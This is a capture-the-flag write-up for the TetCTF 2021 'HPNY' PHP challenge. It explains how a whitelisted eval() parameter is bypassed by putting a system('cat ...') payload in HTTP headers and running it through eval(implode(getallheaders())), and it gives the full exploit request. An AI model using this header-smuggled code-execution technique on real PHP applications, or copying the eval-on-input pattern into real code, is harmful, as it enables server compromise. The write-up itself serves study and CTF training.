### Code:

```php  
<?php

function get_lucky_word() {
    $words = array("Chuc mung nam moi", "gongxifacai", "happy new year!", "bonne année", "Akemashite omedeto gozaimasu", "Seh heh bok mahn ee bahd euh sae yo", "kimochi", "Feliz Año Nuevo", "S novim godom", "Gelukkig Nieuwjaar", "selamat tahun baru", "iniya puthandu nal Vazhthukkal");
    return $words[array_rand($words)];
}

function get_lucky_number() {
    $numb = rand(0,100);
    return strval($numb);
}


if(!isset($_GET["roll"])) {
    show_source(__FILE__);
}
else
{
    $wl = preg_match('/^[a-z\(\)\_\.]+$/i', $_GET["roll"]);

    if($wl === 0 || strlen($_GET["roll"]) > 50) {
        die("bumbadum badum");
    }
    eval("echo ".$_GET["roll"]."();");
}

?>

```

# Explanation: #  
In above code only parameter is "roll". If parameter is not passed then source
code is shown otherwise parameter is processed.  
## Constraints  
There are some constraints on roll parameter:-  
### 1. Length  
Length should be less than 50 characters.  
### 2. Allowed Characters  
- a-z  
- (  
-  )  
-  _  
-  .

## Target  
Flag is in same directory in file "fl4g_here_but_can_you_get_it_hohoho.php".  
1. We need to list all files in directory  
2. We need to read flag file

## Obstacle  
Roll parameter is too constrained to be used for exploitation. So we need to
find another way to deliver our payload, and then execute using roll
parameter.  
## Failed Attempt  
As same as everyone, I wasted many hours on using system command

We can easily list files using

```?roll=system(ls)```

So our first target of finding file name is completed, But when I tried
reading file using

```?roll=readfile(system(ls))```

it only showed content of index.php, Why?

On [PHP System Page](https://www.php.net/manual/en/function.system.php),
mentioned  
```Function Returns the last line of the command output on success```

So while system(ls) is displaying all files, it only passing last file name to
readfile function. And same is true for other similar functions like exec,
passthru.

## Exploitation:  
So I braked problem in parts and solved like this:-

#### 1. Payload Delivery

Roll parameter was too small for payload, So I used HTTP headers for
delivering payload

```User-Agent: eval(system('cat fl4g_here_but_can_you_get_it_hohoho.php'))```

Here, I am reading flag file using cat. cat is called by system function. And
system function is string which is parsed as php code by eval.

#### 2. Reading Payload

So our payload is delivered, now we need to read this.

```getallheaders()``` can be used for reading all headers. But this will
return a array. But if we use implode function like
```implode(getallheaders())```, then it will create a string of all the VALUES
of array as a string. like,

```  
192.46.227.32 eval(system('cat
fl4g_here_but_can_you_get_it_hohoho.php'));text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8en-
US,en;q=0.5gzip, deflate1close11max-age=0

```

So now we have our payload ready. We can execute php code in above string
using eval. So final url will be

```192.46.227.32/?roll=(eval(implode(getallheaders())))```

#### 3. Final step  
Our php code in above string also has other stuff and when eval will try to
execute it will crash. So we should comment out that. How?  
I created two more custom headers, where first one is on top of all header and
had starting of php comment /* and last header I included had ending of php
comment. And I changed payload to close opened comment on start and close on
end. So final request become like this

```  
GET /?roll=(eval(implode(getallheaders()))) HTTP/1.1  
xyz: /*test  
Host: 192.46.227.32  
User-Agent: */ eval(system('cat fl4g_here_but_can_you_get_it_hohoho.php'));/*  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
DNT: 1  
Connection: close  
Upgrade-Insecure-Requests: 1  
Sec-GPC: 1  
abc: tses*/  
```  

Original writeup (https://github.com/hrca-writeups/CTF-
Writeups/blob/master/2021/TetCTF%202021/HPNY.md).